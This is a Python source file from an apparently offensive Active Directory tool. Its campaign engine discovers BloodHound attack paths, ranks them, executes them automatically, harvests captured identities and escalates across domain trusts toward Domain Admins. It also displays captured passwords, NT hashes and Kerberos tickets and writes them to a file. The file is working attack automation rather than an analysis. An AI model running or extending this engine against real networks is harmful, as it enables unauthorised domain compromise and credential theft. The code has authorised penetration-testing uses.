"""Autonomous campaign orchestrator — discover, rank, execute, chain.

The :class:`CampaignOrchestrator` wraps the existing single-path
:class:`AttackOrchestrator` in a discovery loop:

1. **Discover** — query BH CE for ALL reachable high-value targets
2. **Score** — rank paths by privilege value and feasibility
3. **Execute** — run the highest-value path via the existing orchestrator
4. **Re-discover** — from the newly compromised position, find new paths
5. **Chain** — repeat until nothing new is exploitable

Trust escalation (child→parent) is automatically detected and queued
when Domain Admin is reached in a child domain.
"""

from __future__ import annotations

import logging
import time
from typing import Any

from rich.console import Console
from rich.table import Table

from pathstrike.bloodhound.client import BloodHoundClient
from pathstrike.bloodhound.cypher import (
    build_high_value_nodes_query,
    build_reachable_targets_query,
    build_shortest_path_to_target_query,
    build_trust_map_query,
)
from pathstrike.bloodhound.parser import parse_cypher_response
from pathstrike.config import PathStrikeConfig
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.orchestrator import AttackOrchestrator
from pathstrike.engine.rollback import RollbackManager
from pathstrike.engine.scoring import (
    describe_score,
    rank_paths,
    score_target_node,
)
from pathstrike.models import (
    AttackPath,
    CampaignResult,
    ExecutionMode,
    ScoredPath,
)

logger = logging.getLogger("pathstrike.engine.campaign")
console = Console()


class CampaignOrchestrator:
    """Autonomous attack campaign engine.

    Wraps :class:`AttackOrchestrator` in a discover → rank → execute
    loop that automatically chains paths and escalates across trust
    boundaries.
    """

    def __init__(
        self,
        config: PathStrikeConfig,
        bh_client: BloodHoundClient,
        cred_store: CredentialStore,
        rollback_mgr: RollbackManager,
        retry_policy: Any = None,
        mode: ExecutionMode = ExecutionMode.interactive,
        verbose: bool = False,
        max_targets: int = 10,
        reachable_mode: bool = False,
        max_depth: int = 10,
    ) -> None:
        self.config = config
        self.bh_client = bh_client
        self.cred_store = cred_store
        self.rollback_mgr = rollback_mgr
        self.retry_policy = retry_policy
        self.mode = mode
        self.verbose = verbose
        self.max_targets = max_targets
        self.reachable_mode = reachable_mode
        self.max_depth = max_depth

        # Campaign state
        self.owned_identities: set[str] = set()
        self.queried_identities: set[str] = set()
        self.completed_targets: set[str] = set()
        self.failed_paths: list[ScoredPath] = []
        self.domains_compromised: set[str] = set()
        self._captured_creds: list[dict[str, str]] = []

    async def run_campaign(self) -> CampaignResult:
        """Execute the autonomous campaign loop.

        Returns:
            Summary of the campaign's results.
        """
        start_time = time.time()
        result = CampaignResult()

        # Seed with initial identity
        initial_user = self.config.credentials.username
        initial_domain = self.config.domain.name
        initial_identity = f"{initial_user.upper()}@{initial_domain.upper()}"
        self.owned_identities.add(initial_identity)

        console.print(
            f"\n[bold]Starting autonomous campaign from:[/] "
            f"[green]{initial_identity}[/]\n"
        )

        max_iterations = 20  # Safety limit to prevent infinite loops
        iteration = 0
        while iteration < max_iterations:
            iteration += 1

            # Find identities we haven't queried yet
            to_query = self.owned_identities - self.queried_identities
            if not to_query:
                console.print(
                    "\n[bold yellow]No more identities to explore. "
                    "Campaign complete.[/]"
                )
                break

            # --- DISCOVER ---
            all_paths: list[AttackPath] = []
            all_scored: list[ScoredPath] = []
            for identity in to_query:
                self.queried_identities.add(identity)
                console.print(
                    f"[bold]Discovering paths from:[/] [cyan]{identity}[/]"
                )

                if self.reachable_mode:
                    paths = await self._discover_reachable_paths(identity)
                else:
                    paths = await self._discover_paths(identity)
                if paths:
                    all_paths.extend(paths)
                    scored = rank_paths(paths)
                    scored = [
                        s for s in scored
                        if s.path.target.name not in self.completed_targets
                    ]
                    all_scored.extend(scored)

            # Compose trust chains: if a path reaches DA/Domain, append
            # trust edges to create end-to-end cross-domain paths
            trust_extensions = await self._get_trust_edges()
            if trust_extensions:
                composed = self._compose_trust_chains(all_paths, trust_extensions)
                if composed:
                    composed_scored = rank_paths(composed)
                    all_scored.extend(composed_scored)

            # Also add any post-DA trust paths if domains already compromised
            trust_paths = await self._discover_trust_escalation()
            if trust_paths:
                trust_scored = rank_paths(trust_paths)
                all_scored.extend(trust_scored)

            # Re-sort combined results and deduplicate by target
            all_scored.sort(key=lambda s: s.composite_score, reverse=True)
            seen_targets: set[str] = set()
            deduped: list[ScoredPath] = []
            for sp in all_scored:
                if sp.path.target.name not in seen_targets:
                    seen_targets.add(sp.path.target.name)
                    deduped.append(sp)
            all_scored = deduped

            if not all_scored:
                console.print(
                    "\n[bold yellow]No exploitable paths discovered. "
                    "Campaign complete.[/]"
                )
                break

            # --- DISPLAY ---
            self._display_ranked_paths(all_scored, iteration)

            # --- SELECT ---
            if self.mode == ExecutionMode.interactive:
                selected = self._interactive_select(all_scored)
                if selected is None:
                    console.print("[yellow]Campaign aborted by user.[/]")
                    result.duration_seconds = time.time() - start_time
                    return result
                execution_queue = [selected]
            elif self.mode == ExecutionMode.auto:
                execution_queue = all_scored[:self.max_targets]
            else:
                # Dry run — show all and stop
                for sp in all_scored[:self.max_targets]:
                    await self._execute_path(sp)
                break

            # --- EXECUTE ---
            executed_any = False
            for scored_path in execution_queue:
                target_name = scored_path.path.target.name
                if target_name in self.completed_targets:
                    continue

                success = await self._execute_path(scored_path)
                result.total_paths_attempted += 1

                if success:
                    result.total_paths_succeeded += 1
                    self.completed_targets.add(target_name)
                    result.targets_compromised.append(target_name)
                    executed_any = True

                    # Harvest new identities from credential store
                    self._harvest_new_identities()

                    # Check if we compromised a domain
                    self._check_domain_compromise(scored_path)

                    if self.mode != ExecutionMode.dry_run:
                        console.print(
                            f"\n[bold green]Target compromised:[/] {target_name} "
                            f"(score: {scored_path.target_score:.0f} — "
                            f"{describe_score(scored_path.target_score)})"
                        )

                    # Re-discover after escalation
                    if self.config.campaign.rescan_after_escalation:
                        break  # Break to outer loop for re-discovery
                else:
                    result.total_paths_failed += 1
                    self.failed_paths.append(scored_path)

            if not executed_any:
                console.print(
                    "\n[bold yellow]No more paths to execute. "
                    "Campaign complete.[/]"
                )
                break

        # --- SUMMARY ---
        result.domains_compromised = list(self.domains_compromised)
        result.credentials_captured = sum(
            len(creds) for creds in self.cred_store._credentials.values()
        )
        result.duration_seconds = time.time() - start_time

        # Snapshot credentials before they get wiped
        self._captured_creds = self._snapshot_credentials()

        self._display_campaign_summary(result)
        self._save_credentials_file()
        return result

    # ------------------------------------------------------------------
    # Discovery
    # ------------------------------------------------------------------

    async def _discover_paths(
        self, identity: str
    ) -> list[AttackPath]:
        """Query BH CE for shortest paths to each high-value target.

        Two-step approach:
        1. Find all high-value nodes in the domain
        2. For each, query the shortest path from identity → target
        """
        domain = self.config.domain.name

        # Step 1: Find all high-value targets
        hv_query, _ = build_high_value_nodes_query(domain)
        try:
            hv_response = await self.bh_client.cypher_query(hv_query)
        except Exception as exc:
            logger.warning("High-value target discovery failed: %s", exc)
            return []

        # Extract target names from literals
        target_names: list[str] = []
        literals = hv_response.get("data", {}).get("literals", [])
        for lit in literals:
            if lit.get("key") == "name" and lit.get("value"):
                target_names.append(lit["value"])

        if not target_names:
            logger.info("No high-value targets found in %s", domain)
            return []

        logger.info(
            "Found %d high-value target(s) in %s", len(target_names), domain,
        )

        # Step 2: Find shortest path to each target
        all_paths: list[AttackPath] = []
        for target_name in target_names:
            if target_name == identity:
                continue
            if target_name in self.completed_targets:
                continue

            path_query, _ = build_shortest_path_to_target_query(
                identity, target_name,
            )
            try:
                response = await self.bh_client.cypher_query(path_query)
                paths = parse_cypher_response(response)
                all_paths.extend(paths)
            except Exception as exc:
                logger.debug("No path to %s: %s", target_name, exc)

        logger.info(
            "Discovered %d reachable path(s) from %s",
            len(all_paths), identity,
        )
        return all_paths

    async def _discover_reachable_paths(
        self, identity: str
    ) -> list[AttackPath]:
        """Query BH CE for paths to ALL exploitable reachable nodes.

        Unlike :meth:`_discover_paths`, this does NOT restrict targets to
        high-value principals.  It returns paths to any reachable
        User/Group/Computer/Domain node via handler-backed edges, enabling
        opportunistic escalation through non-privileged intermediates
        (e.g. a non-admin group that ACLs into a service account).
        """
        query, _ = build_reachable_targets_query(
            identity, max_depth=self.max_depth,
        )
        try:
            response = await self.bh_client.cypher_query(query)
            paths = parse_cypher_response(response)
        except Exception as exc:
            logger.warning("Reachable-targets discovery failed: %s", exc)
            return []

        filtered = [
            p for p in paths
            if p.target.name != identity
            and p.target.name not in self.completed_targets
        ]
        logger.info(
            "Discovered %d reachable path(s) from %s",
            len(filtered), identity,
        )
        return filtered

    async def _discover_trust_escalation(self) -> list[AttackPath]:
        """Check for trust edges from compromised domains.

        Only triggers after DA is achieved in at least one domain.
        Returns trust paths that haven't been executed yet.
        """
        if not self.domains_compromised:
            return []

        trust_paths: list[AttackPath] = []
        try:
            query, _ = build_trust_map_query()
            response = await self.bh_client.cypher_query(query)
            all_trust = parse_cypher_response(response)

            for tp in all_trust:
                target = tp.target.name.upper()
                # Skip if target is already compromised or in a compromised domain
                if target in self.completed_targets:
                    continue
                if target in self.domains_compromised:
                    continue
                trust_paths.append(tp)
        except Exception as exc:
            logger.debug("Trust discovery failed: %s", exc)

        return trust_paths

    async def _get_trust_edges(self) -> list[AttackPath]:
        """Get individual trust edges as single-step AttackPaths.

        The trust query returns all edges between Domain nodes.  We split
        the parsed path into individual single-edge paths so each can be
        composed independently (child→parent vs parent→child).
        """
        from pathstrike.models import PathStep

        try:
            query, _ = build_trust_map_query()
            response = await self.bh_client.cypher_query(query)
            parsed = parse_cypher_response(response)

            individual: list[AttackPath] = []
            for path in parsed:
                for step in path.steps:
                    # Create a single-step AttackPath for each trust edge
                    single = AttackPath(
                        steps=[PathStep(
                            index=0,
                            edge=step.edge,
                            handler_name=step.handler_name,
                            status="pending",
                        )],
                        source=step.edge.source,
                        target=step.edge.target,
                    )
                    # Skip trust edges pointing back to already-compromised domains
                    if single.target.name.upper() in self.domains_compromised:
                        continue
                    if single.target.name.upper() in {t.upper() for t in self.completed_targets}:
                        continue
                    individual.append(single)

            logger.debug("Found %d individual trust edge(s)", len(individual))
            return individual
        except Exception as exc:
            logger.debug("Trust edge discovery failed: %s", exc)
            return []

    def _compose_trust_chains(
        self,
        base_paths: list[AttackPath],
        trust_paths: list[AttackPath],
    ) -> list[AttackPath]:
        """Compose DA paths with trust edges into end-to-end cross-domain paths.

        If a base path ends at DA or a Domain node, and a trust edge
        starts from that domain, create a combined path that goes all
        the way through the trust boundary.
        """
        from pathstrike.models import PathStep

        composed: list[AttackPath] = []
        da_names = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}

        for base in base_paths:
            target_name = base.target.name.split("@")[0].upper()
            # Extract domain from the target name (e.g. DOMAIN ADMINS@NORTH.SEV... → NORTH.SEV...)
            if "@" in base.target.name:
                target_domain = base.target.name.split("@")[1].upper()
            elif base.target.domain:
                target_domain = base.target.domain.upper()
            else:
                target_domain = base.target.name.upper()  # Domain nodes ARE the domain

            # Check if this path reaches DA or a Domain node
            is_da_path = target_name in da_names or base.target.label == "Domain"
            if not is_da_path:
                continue

            logger.debug(
                "Composable DA path: %s (domain=%s)", base.target.name, target_domain,
            )

            # Find trust edges FROM this domain TO another domain
            for trust in trust_paths:
                trust_source = trust.source.name.upper()
                trust_target = trust.target.name.upper()

                # Trust source must match the DA path's domain
                if trust_source != target_domain:
                    continue

                # Skip if trust goes back to same domain
                if trust_target == target_domain:
                    continue

                # Skip already completed
                if trust.target.name in self.completed_targets:
                    continue

                logger.debug(
                    "Composing: %s → [trust] → %s",
                    base.target.name, trust.target.name,
                )

                # Compose: base path steps + trust path steps
                combined_steps = list(base.steps)
                for i, trust_step in enumerate(trust.steps):
                    combined_steps.append(
                        PathStep(
                            index=len(combined_steps),
                            edge=trust_step.edge,
                            handler_name=trust_step.handler_name,
                            status="pending",
                        )
                    )

                composed_path = AttackPath(
                    steps=combined_steps,
                    source=base.source,
                    target=trust.target,
                )
                composed.append(composed_path)

        return composed

    # ------------------------------------------------------------------
    # Execution
    # ------------------------------------------------------------------

    async def _execute_path(self, scored: ScoredPath) -> bool:
        """Execute a single scored path via the existing orchestrator."""
        path = scored.path

        if self.mode == ExecutionMode.dry_run:
            console.print(
                f"  [dim][DRY RUN] Would execute {len(path.steps)} steps "
                f"to {path.target.name}[/]"
            )
            return True

        orchestrator = AttackOrchestrator(
            self.config,
            self.cred_store,
            self.rollback_mgr,
            retry_policy=self.retry_policy,
            verbose=self.verbose,
        )

        try:
            return await orchestrator.execute_path(path, self.mode)
        except Exception as exc:
            logger.error("Path execution failed: %s", exc)
            return False

    # ------------------------------------------------------------------
    # State tracking
    # ------------------------------------------------------------------

    def _harvest_new_identities(self) -> None:
        """Extract newly captured identities from the credential store."""
        for key in self.cred_store._credentials:
            identity = key.upper()
            if identity not in self.owned_identities:
                self.owned_identities.add(identity)
                logger.info("New identity captured: %s", identity)

    def _check_domain_compromise(self, scored: ScoredPath) -> None:
        """Check if the completed path represents domain compromise.

        For composed paths (DA + trust), also marks intermediate domains
        as compromised when DA/Domain targets are encountered mid-path.
        """
        da_names = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}

        # Check ALL steps in the path — not just the final target
        for step in scored.path.steps:
            step_target = step.edge.target
            step_name = step_target.name.split("@")[0].upper()

            if step_name in da_names:
                domain = (
                    step_target.domain
                    or (step_target.name.split("@")[1] if "@" in step_target.name else "")
                )
                if domain:
                    domain_upper = domain.upper()
                    if domain_upper not in self.domains_compromised:
                        self.domains_compromised.add(domain_upper)
                        self.completed_targets.add(step_target.name)
                        console.print(
                            f"  [bold red]Domain compromised:[/] [green]{domain}[/]"
                        )

            if step_target.label and step_target.label.lower() == "domain":
                name_upper = step_target.name.upper()
                if name_upper not in self.domains_compromised:
                    self.domains_compromised.add(name_upper)
                    self.completed_targets.add(step_target.name)
                    console.print(
                        f"  [bold red]Domain compromised:[/] [green]{step_target.name}[/]"
                    )

    # ------------------------------------------------------------------
    # Selection
    # ------------------------------------------------------------------

    def _interactive_select(
        self, scored: list[ScoredPath]
    ) -> ScoredPath | None:
        """Let the user pick a target by number.

        Returns the selected ScoredPath, or None to abort.
        """
        console.print(
            "\n[bold]Select a target to attack:[/] "
            "[dim](enter number, or 'q' to quit)[/]"
        )
        choice = console.input(f"[1-{len(scored[:20])}] (1): ").strip()

        if choice.lower() == "q":
            return None

        if choice == "" or choice.lower() == "y":
            return scored[0]

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(scored):
                target = scored[idx]
                console.print(
                    f"  Selected: [green]{target.path.target.name}[/] "
                    f"(score: {target.composite_score:.1f})"
                )
                return target
        except ValueError:
            pass

        console.print("[yellow]Invalid selection, using #1.[/]")
        return scored[0]

    # ------------------------------------------------------------------
    # Display
    # ------------------------------------------------------------------

    def _display_ranked_paths(
        self, scored: list[ScoredPath], iteration: int
    ) -> None:
        """Show a Rich table of ranked attack paths."""
        table = Table(
            title=f"Discovered Attack Paths (Round {iteration})",
        )
        table.add_column("#", style="bold", width=3)
        table.add_column("Score", style="bold", width=7)
        table.add_column("Level", style="red", width=10)
        table.add_column("Target", style="green")
        table.add_column("Domain", style="cyan")
        table.add_column("Steps", style="yellow", width=5)
        table.add_column("Edge Types", style="dim")

        for i, sp in enumerate(scored[:20], 1):
            # Show unique edge types in order, not all 71 steps
            seen = []
            for s in sp.path.steps:
                if not seen or seen[-1] != s.edge.edge_type:
                    seen.append(s.edge.edge_type)
            edges = " → ".join(seen)

            table.add_row(
                str(i),
                f"{sp.composite_score:.1f}",
                describe_score(sp.target_score),
                sp.path.target.name,
                sp.domain,
                str(len(sp.path.steps)),
                edges,
            )

        console.print(table)

    def _snapshot_credentials(self) -> list[dict[str, str]]:
        """Snapshot all credentials from the store before they get wiped."""
        creds: list[dict[str, str]] = []
        for key, cred_list in self.cred_store._credentials.items():
            for cred in cred_list:
                creds.append({
                    "username": cred.username,
                    "domain": cred.domain,
                    "type": cred.cred_type.value,
                    "value": cred.value,
                    "obtained_from": cred.obtained_from or "",
                })
        return creds

    def _save_credentials_file(self) -> None:
        """Save captured credentials to a file."""
        if not self._captured_creds:
            return

        import os
        from pathlib import Path

        creds_dir = Path.home() / ".pathstrike"
        creds_dir.mkdir(parents=True, exist_ok=True)
        creds_file = creds_dir / "campaign_credentials.txt"

        with open(creds_file, "w") as fh:
            fh.write("# PathStrike Campaign Credentials\n")
            fh.write(f"# Captured: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            for cred in self._captured_creds:
                fh.write(
                    f"{cred['domain']}/{cred['username']}  "
                    f"[{cred['type']}]  {cred['value']}\n"
                )
                if cred["obtained_from"]:
                    fh.write(f"  # {cred['obtained_from']}\n")

        # Set restrictive permissions
        os.chmod(creds_file, 0o600)
        console.print(
            f"\n[bold]Credentials saved to:[/] [green]{creds_file}[/]"
        )

    def _display_campaign_summary(self, result: CampaignResult) -> None:
        """Show final campaign results."""
        console.print("\n" + "═" * 60)
        console.print("[bold]Campaign Summary[/]")
        console.print("═" * 60)

        if result.targets_compromised:
            console.print(f"\n[bold green]Targets compromised ({len(result.targets_compromised)}):[/]")
            for t in result.targets_compromised:
                console.print(f"  ✅ {t}")
        else:
            console.print("\n[yellow]No targets compromised.[/]")

        if result.domains_compromised:
            console.print(f"\n[bold red]Domains compromised ({len(result.domains_compromised)}):[/]")
            for d in result.domains_compromised:
                console.print(f"  🏴 {d}")

        # Show captured credentials with actual values
        if self._captured_creds:
            console.print(f"\n[bold cyan]Captured Credentials ({len(self._captured_creds)}):[/]")
            for cred in self._captured_creds:
                ctype = cred["type"]
                user = cred["username"]
                domain = cred["domain"]
                value = cred["value"]

                if ctype == "nt_hash":
                    console.print(
                        f"  💎 [green]{domain}/{user}[/]  "
                        f"[yellow]NT Hash:[/] {value}"
                    )
                elif ctype == "password":
                    console.print(
                        f"  🔑 [green]{domain}/{user}[/]  "
                        f"[yellow]Password:[/] {value}"
                    )
                elif ctype == "ccache":
                    console.print(
                        f"  🎫 [green]{domain}/{user}[/]  "
                        f"[yellow]Ticket:[/] {value}"
                    )
                else:
                    console.print(
                        f"  🔐 [green]{domain}/{user}[/]  "
                        f"[yellow]{ctype}:[/] {value}"
                    )

        console.print(f"\nPaths attempted: {result.total_paths_attempted}")
        console.print(f"Paths succeeded: [green]{result.total_paths_succeeded}[/]")
        console.print(f"Paths failed: [red]{result.total_paths_failed}[/]")
        console.print(f"Duration: {result.duration_seconds:.1f}s")
        console.print("═" * 60)
